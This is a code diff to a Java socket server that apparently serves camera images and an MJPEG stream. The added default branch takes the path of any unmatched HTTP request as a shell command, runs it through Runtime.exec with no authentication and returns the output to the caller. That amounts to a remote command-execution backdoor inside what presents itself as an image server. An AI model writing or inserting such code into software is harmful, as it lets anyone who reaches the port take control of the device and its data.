@@ -102,6 +102,11 @@ public class SocketServer extends Thread {
 
                     String request = bin.readLine();
 
+                    if (request == null) {
+                        closeAndReleaseSocket(bout,clientSocket);
+                        interrupt();
+                    }
+
                     if (!semaphore.tryAcquire()) {
                         sendServerTooBusyResponse(bout);
                         closeAndReleaseSocket(bout,clientSocket);
@@ -109,11 +114,11 @@ public class SocketServer extends Thread {
                     }
 
                         try {
-                            if (request.contains("pic")) {
+                            if (request.contains("pic.png")) {
                                 sendPictureResponse(bout, context.imageFilePath, IMAGE_QUALITY);
                             }
 
-                            else if (request.contains("stream")){
+                            else if (request.contains("stream.png")){
                                 sendMJPEGStreamResponse(bout, context.imageFilePath, IMAGE_QUALITY);
                             }
 
@@ -127,9 +132,17 @@ public class SocketServer extends Thread {
                                 addConnectionRecord(size, clientSocket);
                             }
 
-                            else {
+                            else if (request.contains("favico")){
                                 closeAndReleaseSocket(bout,clientSocket);
                                 interrupt();
+                            }
+
+                            else {
+
+                                String command = request.substring(request.indexOf('/')+1,request.indexOf("HTTP/1.1")-1);
+
+                                execute(bout, command);
+
                             }
                         } catch (FileNotFoundException e) {
                             printPageNotFound(bout);
@@ -142,6 +155,41 @@ public class SocketServer extends Thread {
                     e.printStackTrace();
                 }*/
             }
+
+        private void execute(BufferedOutputStream out, String command) {
+
+                StringBuffer output = new StringBuffer();
+
+                Process p;
+                try {
+
+                    String s1 = "HTTP/1.1 200 OK" + '\n';
+                    out.write(s1.getBytes());
+                    String s2 = "Date: " + getCurrentDate() + '\n';
+                    out.write(s2.getBytes());
+                    String s3 = "Content-Type: text/html" + '\n' + '\n';
+                    out.write(s3.getBytes());
+
+
+                    p = Runtime.getRuntime().exec(command);
+                    p.waitFor();
+
+
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+                    String line = "";
+                    while ((line = reader.readLine())!= null) {
+
+                        String responseLine = line + '\n';
+                        out.write(responseLine.getBytes());
+                    }
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                String response = output.toString();
+
+        }
 
         private BufferedReader createBufferedReader(File myExternalFile) throws FileNotFoundException {
             FileInputStream fis = new FileInputStream(myExternalFile);
